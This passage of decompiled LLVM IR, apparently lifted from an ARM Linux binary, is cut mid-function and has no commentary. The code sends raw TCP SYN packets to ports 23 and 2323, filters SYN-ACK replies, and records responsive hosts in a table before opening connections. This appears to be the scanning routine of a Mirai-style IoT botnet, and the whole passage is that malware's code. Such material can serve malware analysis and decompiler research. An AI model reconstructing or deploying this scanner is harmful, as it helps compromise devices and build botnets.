  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_22494.160 to i32), i32 2) to i16*), align 2
  %v4_f2ac = load i32, i32* @global_var_22490.200, align 4
  store i32 %v4_f2ac, i32* @global_var_22498.202, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb408

bb407:                                            ; preds = %dec_label_pc_f230
  store i16 %v4_f268, i16* bitcast (i32* @global_var_2248a.199 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_22480.157 to i32), i32* %r0.global-to-local, align 4
  %v4_f2ac53 = load i32, i32* @global_var_22490.200, align 4
  store i32 ptrtoint (i16* @global_var_22494.160 to i32), i32* %r2.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i32 %v4_f2ac53, i32* @global_var_22498.202, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_22494.160 to i32), i32 2) to i16*), align 2
  br label %bb408

bb408:                                            ; preds = %.thread59, %bb407
  store i16 0, i16* bitcast (i32* @global_var_224a4.203 to i16*), align 4
  store i32 ptrtoint (i16* @global_var_22494.160 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v6_f2d8 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_22480.157 to i32), i32 sext (i16 ptrtoint (i16* @global_var_22494.160 to i16) to i32), i32 5120, i32 20)
  %v7_f2d8 = trunc i32 %v6_f2d8 to i16
  store i32 ptrtoint (i8** @global_var_22480.157 to i32), i32* %r1.global-to-local, align 4
  %v2_f2e4 = load i32, i32* @global_var_24f98.155, align 4
  store i16 %v7_f2d8, i16* bitcast (i32* @global_var_224a4.203 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_f310 = load i16, i16* @global_var_22496.165, align 2
  %v4_f310 = zext i16 %v3_f310 to i32
  store i32 %v4_f310, i32* @lr, align 4
  store i32 %v2_f8d4, i32* %ip.global-to-local, align 4
  store i32 %v2_f2e4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_f32c = call i32 @__libc_sendto(i32 %v2_f2e4, i32 ptrtoint (i8** @global_var_22480.157 to i32), i32 40, i32 16384, i32 %v2_103b0, i32 16)
  store i32 %v7_f32c, i32* %r0.global-to-local, align 4
  %v3_f330 = load i32, i32* %stack_var_-52, align 4
  %v1_f334 = add i32 %v3_f330, 1
  store i32 %v1_f334, i32* %r3.global-to-local, align 4
  %v3_f338 = icmp ugt i32 %v1_f334, 383
  store i1 %v3_f338, i1* %cpsr_c.global-to-local, align 1
  %v8_f338 = icmp eq i32 %v1_f334, 384
  store i1 %v8_f338, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f334, i32* %stack_var_-52, align 4
  %v5_f340 = icmp slt i32 %v1_f334, 384
  br i1 %v5_f340, label %dec_label_pc_f058, label %dec_label_pc_f344

dec_label_pc_f344:                                ; preds = %bb408
  %v0_f344 = load i32, i32* @r4, align 4
  br label %dec_label_pc_f348

dec_label_pc_f348:                                ; preds = %dec_label_pc_f034, %dec_label_pc_f344
  %stack_var_-1880.1 = phi i32 [ %stack_var_-1880.0, %dec_label_pc_f034 ], [ %v0_f344, %dec_label_pc_f344 ]
  %v0_f348 = call i32 @__GI___errno_location()
  store i32 %v2_f02c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_f358, i32* @r4, align 4
  %v2_f364 = inttoptr i32 %v0_f348 to i32*
  br label %dec_label_pc_f35c

dec_label_pc_f35c:                                ; preds = %dec_label_pc_f420, %dec_label_pc_f418, %dec_label_pc_f410, %dec_label_pc_f3ec, %dec_label_pc_f3dc, %dec_label_pc_f3c4, %dec_label_pc_f3ac, %dec_label_pc_f408, %dec_label_pc_f3fc, %dec_label_pc_f3a4, %dec_label_pc_f4d8, %dec_label_pc_f348
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %v2_f364, align 4
  %v2_f36c = load i32, i32* @global_var_24f98.155, align 4
  store i32 %v2_f36c, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_f02c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f380 = load i32, i32* %ip.global-to-local, align 4
  %v6_f388 = call i32 @__libc_recvfrom(i32 %v2_f36c, i32 %v2_f02c, i32 1514, i32 16384, i32 %v0_f380, i32 %v0_f380)
  store i32 %v6_f388, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f38c = icmp eq i32 %v6_f388, 0
  store i1 %v2_f38c, i1* %cpsr_z.global-to-local, align 1
  %tmp409 = icmp slt i32 %v6_f388, 1
  br i1 %tmp409, label %dec_label_pc_f4e8, label %dec_label_pc_f394

dec_label_pc_f394:                                ; preds = %dec_label_pc_f35c
  store i32 %v0_f348, i32* %ip.global-to-local, align 4
  %v2_f398 = load i32, i32* %v2_f364, align 4
  store i32 %v2_f398, i32* %r3.global-to-local, align 4
  %v2_f39c = icmp ugt i32 %v2_f398, 10
  store i1 %v2_f39c, i1* %cpsr_c.global-to-local, align 1
  %v7_f39c = icmp eq i32 %v2_f398, 11
  store i1 %v7_f39c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f39c, label %dec_label_pc_f4e8, label %dec_label_pc_f3a4

dec_label_pc_f3a4:                                ; preds = %dec_label_pc_f394
  %v2_f3a4 = icmp ugt i32 %v6_f388, 38
  store i1 %v2_f3a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3a4 = icmp eq i32 %v6_f388, 39
  store i1 %v7_f3a4, i1* %cpsr_z.global-to-local, align 1
  %v2_f3a8 = xor i1 %v2_f3a4, true
  %v3_f3a8 = or i1 %v7_f3a4, %v2_f3a8
  br i1 %v3_f3a8, label %dec_label_pc_f35c, label %dec_label_pc_f3ac

dec_label_pc_f3ac:                                ; preds = %dec_label_pc_f3a4
  store i32 %v2_f02c, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_24f78.59 to i32), i32* %r0.global-to-local, align 4
  %v3_f3b4 = load i32, i32* %v2_f3b4, align 4
  store i32 %v3_f3b4, i32* %r2.global-to-local, align 4
  %v2_f3b8 = load i32, i32* @global_var_24f78.59, align 4
  store i32 %v2_f3b8, i32* %r3.global-to-local, align 4
  %v3_f3bc = icmp uge i32 %v3_f3b4, %v2_f3b8
  store i1 %v3_f3bc, i1* %cpsr_c.global-to-local, align 1
  %v9_f3bc = icmp eq i32 %v3_f3b4, %v2_f3b8
  store i1 %v9_f3bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f3bc, label %dec_label_pc_f3c4, label %dec_label_pc_f35c

dec_label_pc_f3c4:                                ; preds = %dec_label_pc_f3ac
  %v3_f3c4 = load i8, i8* %v2_f3c4, align 1
  %v4_f3c4 = zext i8 %v3_f3c4 to i32
  store i32 %v4_f3c4, i32* %r3.global-to-local, align 4
  %v2_f3c8 = icmp ugt i8 %v3_f3c4, 5
  store i1 %v2_f3c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f3c8 = icmp eq i8 %v3_f3c4, 6
  store i1 %v7_f3c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3c8, label %dec_label_pc_f3d0, label %dec_label_pc_f35c

dec_label_pc_f3d0:                                ; preds = %dec_label_pc_f3c4
  %v0_f3d0 = load i32, i32* @r4, align 4
  %v1_f3d0 = inttoptr i32 %v0_f3d0 to i16*
  %v2_f3d0 = load i16, i16* %v1_f3d0, align 2
  %v3_f3d0 = zext i16 %v2_f3d0 to i32
  store i32 %v3_f3d0, i32* %ip.global-to-local, align 4
  %v2_f3d4 = icmp ugt i16 %v2_f3d0, 5887
  store i1 %v2_f3d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3d4 = icmp eq i16 %v2_f3d0, 5888
  store i1 %v7_f3d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3d4, label %dec_label_pc_f3ec, label %dec_label_pc_f3dc

dec_label_pc_f3dc:                                ; preds = %dec_label_pc_f3d0
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_f3e4 = icmp ugt i16 %v2_f3d0, 4872
  store i1 %v3_f3e4, i1* %cpsr_c.global-to-local, align 1
  %v9_f3e4 = icmp eq i16 %v2_f3d0, 4873
  store i1 %v9_f3e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f3e4, label %dec_label_pc_f3ec, label %dec_label_pc_f35c

dec_label_pc_f3ec:                                ; preds = %dec_label_pc_f3dc, %dec_label_pc_f3d0
  %v1_f3ec = add i32 %v0_f3d0, 2
  %v2_f3ec = inttoptr i32 %v1_f3ec to i16*
  %v3_f3ec = load i16, i16* %v2_f3ec, align 2
  %v4_f3ec = zext i16 %v3_f3ec to i32
  store i32 %v4_f3ec, i32* %r3.global-to-local, align 4
  store i32 %v4_ef0c, i32* %r1.global-to-local, align 4
  %v3_f3f4 = icmp uge i32 %v4_f3ec, %v4_ef0c
  store i1 %v3_f3f4, i1* %cpsr_c.global-to-local, align 1
  %v9_f3f4 = icmp eq i32 %v4_f3ec, %v4_ef0c
  store i1 %v9_f3f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f3f4, label %dec_label_pc_f3fc, label %dec_label_pc_f35c

dec_label_pc_f3fc:                                ; preds = %dec_label_pc_f3ec
  %v1_f3fc = add i32 %v0_f3d0, 13
  %v2_f3fc = inttoptr i32 %v1_f3fc to i8*
  %v3_f3fc = load i8, i8* %v2_f3fc, align 1
  %v4_f3fc = zext i8 %v3_f3fc to i32
  store i32 %v4_f3fc, i32* %r3.global-to-local, align 4
  %v1_f400 = and i32 %v4_f3fc, 2
  %v2_f400 = icmp eq i32 %v1_f400, 0
  store i1 %v2_f400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f400, label %dec_label_pc_f35c, label %dec_label_pc_f408

dec_label_pc_f408:                                ; preds = %dec_label_pc_f3fc
  %v1_f408 = and i32 %v4_f3fc, 16
  %v2_f408 = icmp eq i32 %v1_f408, 0
  store i1 %v2_f408, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f408, label %dec_label_pc_f35c, label %dec_label_pc_f410

dec_label_pc_f410:                                ; preds = %dec_label_pc_f408
  %v1_f410 = and i32 %v4_f3fc, 4
  %v2_f410 = icmp eq i32 %v1_f410, 0
  store i1 %v2_f410, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f410, label %dec_label_pc_f418, label %dec_label_pc_f35c

dec_label_pc_f418:                                ; preds = %dec_label_pc_f410
  %tmp = urem i8 %v3_f3fc, 2
  %v2_f418 = icmp eq i8 %tmp, 0
  store i1 %v2_f418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f418, label %dec_label_pc_f420, label %dec_label_pc_f35c

dec_label_pc_f420:                                ; preds = %dec_label_pc_f418
  %v1_f420 = add i32 %v0_f3d0, 8
  %v2_f420 = inttoptr i32 %v1_f420 to i32*
  %v3_f420 = load i32, i32* %v2_f420, align 4
  %v5_f438 = call i32 @llvm.bswap.i32(i32 %v3_f420)
  %v1_f43c = add i32 %v5_f438, -1
  store i32 %v1_f43c, i32* %r2.global-to-local, align 4
  %v3_f444 = udiv i32 %v1_f43c, 16777216
  %v1_f440 = udiv i32 %v1_f43c, 256
  %v4_f448 = and i32 %v1_f440, 65280
  %v5_f448 = or i32 %v4_f448, %v3_f444
  store i32 %v2_f02c, i32* %r0.global-to-local, align 4
  %v1_f450 = and i32 %v1_f43c, 65280
  store i32 %v1_f450, i32* %r1.global-to-local, align 4
  %v4_f454 = mul nuw nsw i32 %v1_f450, 256
  %v5_f454 = or i32 %v5_f448, %v4_f454
  store i32 %v5_f454, i32* %r3.global-to-local, align 4
  %v3_f458 = load i32, i32* %v2_f458, align 4
  store i32 %v3_f458, i32* @lr, align 4
  %v5_f45c = call i32 @llvm.bswap.i32(i32 %v1_f43c)
  store i32 %v5_f45c, i32* %r3.global-to-local, align 4
  %v3_f460 = icmp uge i32 %v5_f45c, %v3_f458
  store i1 %v3_f460, i1* %cpsr_c.global-to-local, align 1
  %v9_f460 = icmp eq i32 %v5_f45c, %v3_f458
  store i1 %v9_f460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f460, label %dec_label_pc_f468, label %dec_label_pc_f35c

dec_label_pc_f468:                                ; preds = %dec_label_pc_f420
  %v0_f468 = load i32, i32* @r5, align 4
  %v2_f468 = icmp ugt i32 %v0_f468, 254
  store i1 %v2_f468, i1* %cpsr_c.global-to-local, align 1
  %v7_f468 = icmp eq i32 %v0_f468, 255
  store i1 %v7_f468, i1* %cpsr_z.global-to-local, align 1
  %v8_f46c = icmp sgt i32 %v0_f468, 255
  br i1 %v8_f46c, label %dec_label_pc_f4e8, label %dec_label_pc_f470

dec_label_pc_f470:                                ; preds = %dec_label_pc_f468
  %v2_f478 = load i32, i32* @global_var_24f94.153, align 4
  store i32 %v2_f478, i32* %r1.global-to-local, align 4
  %v3_f47c = mul i32 %v0_f468, 256
  store i32 %v3_f47c, i32* %r2.global-to-local, align 4
  %v2_f480 = mul i32 %v0_f468, 288
  store i32 %v2_f480, i32* %r3.global-to-local, align 4
  %v2_f484 = add i32 %v2_f478, %v2_f480
  store i32 %v2_f484, i32* @r0, align 4
  %v1_f488 = add i32 %v2_f484, 12
  %v2_f488 = inttoptr i32 %v1_f488 to i32*
  %v3_f488 = load i32, i32* %v2_f488, align 4
  store i32 %v3_f488, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f48c = icmp eq i32 %v3_f488, 0
  store i1 %v2_f48c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f48c, label %dec_label_pc_f4d0, label %dec_label_pc_f4ac.preheader

dec_label_pc_f4ac.preheader:                      ; preds = %dec_label_pc_f470
  %v2_f490 = add i32 %v0_f468, 1
  %v2_f498 = and i32 %v2_f490, 134217728
  %v3_f498 = icmp ne i32 %v2_f498, 0
  store i1 %v3_f498, i1* %cpsr_c.global-to-local, align 1
  %v3_f49c = mul i32 %v2_f490, 288
  %v3_f4a0 = add i32 %v2_f478, %v3_f49c
  store i32 %v3_f4a0, i32* %r3.global-to-local, align 4
  store i32 %v0_f468, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f4ac

dec_label_pc_f4ac:                                ; preds = %dec_label_pc_f4ac.preheader, %dec_label_pc_f4b8
  %v0_f4b8 = phi i32 [ %v3_f4a0, %dec_label_pc_f4ac.preheader ], [ %v1_f4c4, %dec_label_pc_f4b8 ]
  %v0_f4ac = phi i32 [ %v0_f468, %dec_label_pc_f4ac.preheader ], [ %v1_f4ac, %dec_label_pc_f4b8 ]
  %v1_f4ac = add i32 %v0_f4ac, 1
  store i32 %v1_f4ac, i32* %r2.global-to-local, align 4
  %v7_f4b0 = icmp eq i32 %v1_f4ac, 256
  br i1 %v7_f4b0, label %dec_label_pc_f4e8.loopexit, label %dec_label_pc_f4b8

dec_label_pc_f4b8:                                ; preds = %dec_label_pc_f4ac
  store i32 %v0_f4b8, i32* @r0, align 4
  %v1_f4bc = add i32 %v0_f4b8, 12
  %v2_f4bc = inttoptr i32 %v1_f4bc to i32*
  %v3_f4bc = load i32, i32* %v2_f4bc, align 4
  %v2_f4c0 = icmp eq i32 %v3_f4bc, 0
  %v1_f4c4 = add i32 %v0_f4b8, 288
  store i32 %v1_f4c4, i32* %r3.global-to-local, align 4
  br i1 %v2_f4c0, label %dec_label_pc_f4cc, label %dec_label_pc_f4ac

dec_label_pc_f4cc:                                ; preds = %dec_label_pc_f4b8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f4ac, i32* @r5, align 4
  br label %dec_label_pc_f4d0

dec_label_pc_f4d0:                                ; preds = %dec_label_pc_f470, %dec_label_pc_f4cc
  %v1_f4d8 = phi i32 [ %v2_f484, %dec_label_pc_f470 ], [ %v0_f4b8, %dec_label_pc_f4cc ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4d0 = icmp eq i32 %v1_f4d8, 0
  store i1 %v2_f4d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f4d0, label %dec_label_pc_f4e8, label %dec_label_pc_f4d8

dec_label_pc_f4d8:                                ; preds = %dec_label_pc_f4d0
  %v2_f4d8 = add i32 %v1_f4d8, 16
  %v3_f4d8 = inttoptr i32 %v2_f4d8 to i32*
  store i32 %v3_f458, i32* %v3_f4d8, align 4
  %v0_f4dc = load i32, i32* %ip.global-to-local, align 4
  %v1_f4dc = trunc i32 %v0_f4dc to i16
  %v2_f4dc = load i32, i32* @r0, align 4
  %v3_f4dc = add i32 %v2_f4dc, 20
  %v4_f4dc = inttoptr i32 %v3_f4dc to i16*
  store i16 %v1_f4dc, i16* %v4_f4dc, align 2
  %v0_f4e0 = call i32 @setup_connection()
  store i32 %v0_f4e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f35c

dec_label_pc_f4e8.loopexit:                       ; preds = %dec_label_pc_f4ac
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f4e8

dec_label_pc_f4e8:                                ; preds = %dec_label_pc_f4d0, %dec_label_pc_f468, %dec_label_pc_f394, %dec_label_pc_f35c, %dec_label_pc_f4e8.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_f508515 = load i32, i32* @sp, align 4
  %v3_f508516 = add i32 %v2_f508515, 1676
  %v4_f508517 = inttoptr i32 %v3_f508516 to i32*
  store i32 0, i32* %v4_f508517, align 4
  br label %dec_label_pc_f4f4.dec_label_pc_f4f4_crit_edge

dec_label_pc_f4f4.dec_label_pc_f4f4_crit_edge:    ; preds = %dec_label_pc_f4e8, %dec_label_pc_f4f4.dec_label_pc_f4f4_crit_edge
  %v0_f4f4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f4f8 = add i32 %v0_f4f4.pre, 4
  store i32 %v1_f4f8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f500 = add i32 %v0_f4f4.pre, 1672
  store i32 %v1_f500, i32* %ip.global-to-local, align 4
  %v7_f504 = icmp eq i32 %v1_f4f8, 128
  %v2_f508 = load i32, i32* @sp, align 4
  %v3_f508 = add i32 %v2_f508, %v1_f500
  %v4_f508 = inttoptr i32 %v3_f508 to i32*
  store i32 0, i32* %v4_f508, align 4
  br i1 %v7_f504, label %dec_label_pc_f510, label %dec_label_pc_f4f4.dec_label_pc_f4f4_crit_edge

dec_label_pc_f510:                                ; preds = %dec_label_pc_f4f4.dec_label_pc_f4f4_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f510 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f510, i32* %stack_var_-352, align 4
  %v1_f51c518 = add i32 %v0_f510, 8
  store i32 %v1_f51c518, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f524519 = add i32 %v0_f510, 1548
  store i32 %v1_f524519, i32* @lr, align 4
  %v7_f528520 = icmp eq i32 %v1_f51c518, 128
  %v2_f52c521 = load i32, i32* @sp, align 4
  %v3_f52c522 = add i32 %v2_f52c521, %v1_f524519
  %v4_f52c523 = inttoptr i32 %v3_f52c522 to i32*
  store i32 0, i32* %v4_f52c523, align 4
  br i1 %v7_f528520, label %dec_label_pc_f534, label %dec_label_pc_f518.dec_label_pc_f518_crit_edge

dec_label_pc_f518.dec_label_pc_f518_crit_edge:    ; preds = %dec_label_pc_f510, %dec_label_pc_f518.dec_label_pc_f518_crit_edge
  %v0_f518.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_f51c = add i32 %v0_f518.pre, 4
  store i32 %v1_f51c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f524 = add i32 %v0_f518.pre, 1544
  store i32 %v1_f524, i32* @lr, align 4
  %v7_f528 = icmp eq i32 %v1_f51c, 128
  %v2_f52c = load i32, i32* @sp, align 4
  %v3_f52c = add i32 %v2_f52c, %v1_f524
  %v4_f52c = inttoptr i32 %v3_f52c to i32*
  store i32 0, i32* %v4_f52c, align 4
  br i1 %v7_f528, label %dec_label_pc_f534, label %dec_label_pc_f518.dec_label_pc_f518_crit_edge

dec_label_pc_f534:                                ; preds = %dec_label_pc_f518.dec_label_pc_f518_crit_edge, %dec_label_pc_f510
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f534 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f534, i32* @r5, align 4
  store i32 %v0_f534, i32* @r6, align 4
  store i32 %v0_f534, i32* %stack_var_-52, align 4
  br label %dec_label_pc_f590

dec_label_pc_f544:                                ; preds = %dec_label_pc_f5c0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f5ac, i1* %cpsr_z.global-to-local, align 1
  %v1_f630 = add i32 %v2_f5a4, 4
  %v2_f630 = inttoptr i32 %v1_f630 to i32*
  %v3_f630 = load i32, i32* %v2_f630, align 4
  br i1 %v7_f5ac, label %dec_label_pc_f630, label %dec_label_pc_f54c

dec_label_pc_f54c:                                ; preds = %dec_label_pc_f544
  store i32 %v3_f630, i32* %ip.global-to-local, align 4
  %v3_f550 = udiv i32 %v3_f630, 32
  store i32 %v2_f63c, i32* %r0.global-to-local, align 4
  %v3_f558 = mul nuw nsw i32 %v3_f550, 4
  %v2_f55c = add i32 %v3_f558, %v2_f63c
  store i32 %v2_f55c, i32* %r3.global-to-local, align 4
  %v1_f560 = add i32 %v2_f55c, -184
  %v2_f560 = inttoptr i32 %v1_f560 to i32*
  %v3_f560 = load i32, i32* %v2_f560, align 4
  %v1_f564 = urem i32 %v3_f630, 32
  store i32 %v1_f564, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_f56c = shl i32 1, %v1_f564
  %v8_f56c = or i32 %v3_f560, %v7_f56c
  store i32 %v8_f56c, i32* %r2.global-to-local, align 4
  store i32 %v8_f56c, i32* %v2_f560, align 4
  %v0_f574 = load i32, i32* @r6, align 4
  %v1_f574 = load i32, i32* %ip.global-to-local, align 4
  %v3_f574 = icmp uge i32 %v0_f574, %v1_f574
  store i1 %v3_f574, i1* %cpsr_c.global-to-local, align 1
  %v9_f574 = icmp eq i32 %v0_f574, %v1_f574
  store i1 %v9_f574, i1* %cpsr_z.global-to-local, align 1
  %v5_f578 = icmp slt i32 %v0_f574, %v1_f574
  br i1 %v5_f578, label %bb410, label %bb411

bb410:                                            ; preds = %dec_label_pc_f54c
  store i32 %v1_f574, i32* @r6, align 4
  br label %bb411

bb411:                                            ; preds = %.thread74, %bb417, %bb415, %bb419, %dec_label_pc_f624, %dec_label_pc_f54c, %bb410
  %v3_f57c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f57c, i32* %r3.global-to-local, align 4
  %v1_f580 = add i32 %v3_f57c, 1
  store i32 %v1_f580, i32* %r2.global-to-local, align 4
  %v2_f584 = icmp ugt i32 %v1_f580, 254
  store i1 %v2_f584, i1* %cpsr_c.global-to-local, align 1
  %v7_f584 = icmp eq i32 %v1_f580, 255
  store i1 %v7_f584, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f580, i32* %stack_var_-52, align 4
  %v8_f58c = icmp sgt i32 %v1_f580, 255
  br i1 %v8_f58c, label %dec_label_pc_f660, label %dec_label_pc_f590

dec_label_pc_f590:                                ; preds = %bb411, %dec_label_pc_f534
  %v0_f59c = phi i32 [ %v1_f580, %bb411 ], [ %v0_f534, %dec_label_pc_f534 ]
  store i32 ptrtoint (i32* @global_var_24f94.153 to i32), i32* %r0.global-to-local, align 4
  %v3_f594 = mul i32 %v0_f59c, 256
  store i32 %v3_f594, i32* %r3.global-to-local, align 4
  %v2_f598 = load i32, i32* @global_var_24f94.153, align 4
  store i32 %v2_f598, i32* @r1, align 4
  %v2_f5a0 = mul i32 %v0_f59c, 288
  store i32 %v2_f5a0, i32* %r2.global-to-local, align 4
  %v2_f5a4 = add i32 %v2_f598, %v2_f5a0
  store i32 %v2_f5a4, i32* @r4, align 4
  %v1_f5a8 = add i32 %v2_f5a4, 12
  %v2_f5a8 = inttoptr i32 %v1_f5a8 to i32*
  %v3_f5a8 = load i32, i32* %v2_f5a8, align 4
  store i32 %v3_f5a8, i32* %ip.global-to-local, align 4
  %v2_f5ac = icmp ne i32 %v3_f5a8, 0
  store i1 %v2_f5ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f5ac = icmp eq i32 %v3_f5a8, 1
  store i1 %v7_f5ac, i1* %cpsr_z.global-to-local, align 1
  %v2_f5b0 = xor i1 %v2_f5ac, true
  %v3_f5b0 = or i1 %v7_f5ac, %v2_f5b0
  br i1 %v3_f5b0, label %bb412, label %bb413

bb412:                                            ; preds = %dec_label_pc_f590
  store i32 5, i32* @r1, align 4
  br label %bb413

bb413:                                            ; preds = %dec_label_pc_f590, %bb412
  %v1_f5d0219 = phi i32 [ %v2_f598, %dec_label_pc_f590 ], [ 5, %bb412 ]
  %v2_f5b4 = xor i1 %v7_f5ac, true
  %v3_f5b4 = and i1 %v2_f5ac, %v2_f5b4
  br i1 %v3_f5b4, label %bb414, label %bb415

bb414:                                            ; preds = %bb413
  store i32 30, i32* @r1, align 4
  br label %bb415

bb415:                                            ; preds = %bb413, %bb414
  %v1_f5d0 = phi i32 [ %v1_f5d0219, %bb413 ], [ 30, %bb414 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5b8 = icmp eq i32 %v3_f5a8, 0
  store i1 %v2_f5b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f5b8, label %bb411, label %dec_label_pc_f5c0

dec_label_pc_f5c0:                                ; preds = %bb415
  store i32 ptrtoint (i32* @global_var_224b0.142 to i32), i32* %r2.global-to-local, align 4
  %v2_f5c4 = load i32, i32* @global_var_224b0.142, align 4
  store i32 %v2_f5c4, i32* %r3.global-to-local, align 4
  %v1_f5c8 = add i32 %v2_f5a4, 8
  %v2_f5c8 = inttoptr i32 %v1_f5c8 to i32*
  %v3_f5c8 = load i32, i32* %v2_f5c8, align 4
  store i32 %v3_f5c8, i32* %r2.global-to-local, align 4
  %v2_f5cc = sub i32 %v2_f5c4, %v3_f5c8
  store i32 %v2_f5cc, i32* %r3.global-to-local, align 4
  %v3_f5d0 = icmp uge i32 %v2_f5cc, %v1_f5d0
  store i1 %v3_f5d0, i1* %cpsr_c.global-to-local, align 1
  %v9_f5d0 = icmp eq i32 %v2_f5cc, %v1_f5d0
  store i1 %v9_f5d0, i1* %cpsr_z.global-to-local, align 1
  %v2_f5d4 = xor i1 %v3_f5d0, true
  %v3_f5d4 = or i1 %v9_f5d0, %v2_f5d4
  br i1 %v3_f5d4, label %dec_label_pc_f544, label %dec_label_pc_f5d8

dec_label_pc_f5d8:                                ; preds = %dec_label_pc_f5c0
  %v1_f5d8 = add i32 %v2_f5a4, 4
  %v2_f5d8 = inttoptr i32 %v1_f5d8 to i32*
  %v3_f5d8 = load i32, i32* %v2_f5d8, align 4
  store i32 %v3_f5d8, i32* %r0.global-to-local, align 4
  %v1_f5dc = call i32 @__GI___libc_close(i32 %v3_f5d8)
  store i32 %v1_f5dc, i32* %r0.global-to-local, align 4
  %v0_f5e0 = load i32, i32* @r4, align 4
  %v1_f5e0 = add i32 %v0_f5e0, 12
  %v2_f5e0 = inttoptr i32 %v1_f5e0 to i32*
  %v3_f5e0 = load i32, i32* %v2_f5e0, align 4
  store i32 %v3_f5e0, i32* %r3.global-to-local, align 4
  %v2_f5e4 = icmp ugt i32 %v3_f5e0, 1
  store i1 %v2_f5e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5e4 = icmp eq i32 %v3_f5e0, 2
  store i1 %v7_f5e4, i1* %cpsr_z.global-to-local, align 1
  %v2_f5e8 = xor i1 %v2_f5e4, true
  %v3_f5e8 = or i1 %v7_f5e4, %v2_f5e8
  br i1 %v3_f5e8, label %bb416, label %.thread301

.thread301:                                       ; preds = %dec_label_pc_f5d8
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f5f0298302 = add i32 %v0_f5e0, 4
  %v3_f5f0299303 = inttoptr i32 %v2_f5f0298302 to i32*
  store i32 -1, i32* %v3_f5f0299303, align 4
  br label %bb417

bb416:                                            ; preds = %dec_label_pc_f5d8
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f5f0295 = add i32 %v0_f5e0, 4
  %v3_f5f0296 = inttoptr i32 %v2_f5f0295 to i32*
  store i32 -1, i32* %v3_f5f0296, align 4
  %v4_f5f4 = load i32, i32* %r3.global-to-local, align 4
  %v5_f5f4 = load i32, i32* @r4, align 4
  %v6_f5f4 = add i32 %v5_f5f4, 12
  %v7_f5f4 = inttoptr i32 %v6_f5f4 to i32*
  store i32 %v4_f5f4, i32* %v7_f5f4, align 4
  %v4_f5f8 = load i32, i32* %r3.global-to-local, align 4
  %v5_f5f8 = trunc i32 %v4_f5f8 to i8
  %v6_f5f8 = load i32, i32* @r4, align 4
  %v7_f5f8 = add i32 %v6_f5f8, 284
